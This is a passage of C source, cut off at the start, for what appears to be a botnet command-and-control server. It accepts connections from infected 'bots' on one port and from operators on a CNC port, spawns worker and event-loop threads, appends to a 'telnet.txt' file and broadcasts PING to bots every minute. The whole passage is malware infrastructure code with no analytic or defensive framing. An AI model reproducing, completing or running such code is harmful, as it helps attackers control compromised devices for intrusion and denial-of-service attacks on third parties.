    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
	    struct kekl args;
	    args.sock = newsockfd;
	    args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;
        pthread_create( &thread, NULL, &BotWorker, (void *)&args);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [Bot-Port] [Threads] [Cnc-Port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("Botnet Screened!\n");
		telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
